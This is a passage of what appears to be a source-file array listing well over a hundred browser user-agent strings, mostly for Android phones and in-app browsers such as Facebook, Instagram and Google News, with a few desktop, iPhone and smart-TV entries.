"Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36 BingSapphire/26.1.410824302",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5765.97 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5855.178 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5465.113 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; EML-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.97.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.54.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/66.2.3445.62346",
"Mozilla/5.0 (Linux; Android 12; 22071219CG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898",
"Mozilla/5.0 (Linux; Android 12; Pixel 4 XL) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.4.94.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2305 Build/SKQ1.221119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.1.0; DRA-L21 Build/HUAWEIDRA-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; FIG-LX1; HMSCore 6.11.4.311; GMSCore 23.32.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-N770F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; RMX2075 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 480dpi; 1080x2245; realme; RMX2075; RMX2075L1; qcom; zh_CN; 510206698)",
"Mozilla/5.0 (Linux; Android 13; SM-S134DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.1518.53",
"Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 GNews Android/2022071088",
"Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00PD Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.56.1200",
"Mozilla/5.0 (Linux; Android 13; 23049PCD8G Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; SM-A202F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GNews Android/2022005154",
"Mozilla/5.0 (Linux; Android 10; SM-A307FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022137898",
"Mozilla/5.0 (Linux; Android 11; CPH1907 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Nokia 7.1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; INE-LX1; HMSCore 6.11.0.331; GMSCore 23.33.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5326a [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/nl_NL;FBOP/5]",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2643.95 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-J610FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5745.183 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; RMX1921) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Galaxy S10+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Unique/100.7.9816.17",
"Mozilla/5.0 (Linux; Android 13; moto e13 Build/TLA33.105-42-42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto e22i Build/SOW32.121-40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/94.4.5903.4",
"Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GNews Android/2022140634",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; FNE-AN00 Build/HONORFNE-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.38 SP-engine/2.76.0 baiduboxapp/13.38.5.10 (Baidu; P1 12) NABar/1.0 dumedia/7.43.11.16",
"Mozilla/5.0 (Linux; Android 7.0; SM-J530F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; motorola edge Build/RPDS31.Q4U-39-26-14-10-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2271 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]",
"Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 440dpi; 1080x2190; Xiaomi/Redmi; 21091116UG; pissarropro; mt6877; pt_BR; 510206479)",
"Mozilla/5.0 (Linux; Android 13; CPH2449 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; CPH2269 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 GNews Android/2022131834",
"Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 13; M1908C3JGG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 2201116TG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 22111317G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOLS30.288-52-23) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A736B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 450dpi; 1080x2167; samsung; SM-A736B; a73xq; qcom; pt_BR; 510206667)",
"Mozilla/5.0 (Linux; Android 10; C21 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-A236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; X96 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 12; T767H Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 22101316G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; SM-M215F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; 220333QNY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.1.88.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/112.0.5615.100 Mobile Safari/537.43",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2862.81 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.36.1-gn",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2817.6 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; SM-S9180) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.54.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2726.57 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaSearchBrowser/23.55.1 BroPP/1.0 YaSearchApp/23.55.1 webOmni SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/114.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Redmi Note 7 Build/TQ3A.230705.001.B4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 9; AFTKA Build/PMAIN1.19565D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-X306F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; H8416 Build/52.1.A.0.532; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Nokia G42 5G Build/TKQ1.221223.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/nl_Qaau_NL;FBOP/5]",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Linux; Android 11; M2007J17G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L61; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-T585 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/279.1.560156937 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 446dpi; 1080x2161; motorola; moto g32; devon; qcom; pt_BR; 510206698)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Viewer/91.9.1478.79",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 Instagram 298.0.0.19.114 (iPhone9,4; iOS 15_7_8; pt_BR; pt; scale=3.00; 1242x2208; 509296496) NW/3",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1M Build/HUAWEIMAR-L21MEA; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 12; M2004J19C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; Armor X10 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; NX659J Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; M2006C3MG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 2210129SG Build/SKQ1.220303.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 11; motorola razr Build/RPVS31.Q2-62-7-11-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Replaio/3.1.9",
"Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5705.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5885.156 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (Linux; arm_64; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5805.54 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5705.52 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOVS32.121-40-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Motorola Defy Build/RZD31.31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; M10 4G PRO X Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 420dpi; 1080x2195; samsung; SM-A315G; a31; mt6768; pt_BR; 510206698)",
"Mozilla/5.0 (Linux; Android 9; SM-A705FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.25.113;]",
"Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2207.0 OMI/4.11.3.57.Martell-3.133 Model/Hisense-MT5659-SDK4-11 (;Hisense;SmartTV;V1100.01.00A.M0112;40A35EEVS) FXM-U2FsdGVkX1/iMqP/z51Oej14Br88++YaRMSqyi37WCmD1H/eAqaJWk2NEPwMYjAp-END",
"Mozilla/5.0 (Linux; Android 13; CPH2339 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/96.2.9281.82",
"Mozilla/5.0 (Linux; Android 13; CPH2247 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 11; M2010J19CG Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 GNews Android/2022150848",
